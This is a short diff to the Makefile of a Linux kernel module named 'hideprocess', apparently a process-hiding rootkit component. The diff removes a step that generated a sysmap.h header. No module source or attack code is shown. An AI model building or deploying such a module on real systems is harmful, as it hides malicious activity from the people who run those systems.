@@ -1,8 +1,6 @@
 obj-m += hideprocess.o
 
 all:
-	@echo "Generating sysmap.h ..."
-	@./gensysmap.sh
 	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
 
 clean:
